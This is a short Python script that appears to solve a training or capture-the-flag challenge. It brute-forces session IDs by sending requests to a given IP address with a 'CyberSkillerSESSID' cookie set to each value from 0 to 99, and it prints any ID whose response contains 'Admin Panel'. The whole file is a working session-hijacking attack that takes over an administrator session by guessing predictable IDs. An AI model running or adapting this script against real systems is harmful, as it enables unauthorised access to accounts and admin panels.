import requests
import sys

if (len(sys.argv) != 2):
    raise Exception('Syntax: python3 program.py ip_address')

ip_address = sys.argv[1]

for i in range(100):
    r = requests.get(f'http://{ip_address}/',
                     cookies={'CyberSkillerSESSID': str(i)})
    if 'Admin Panel' in r.text:
        print(i)
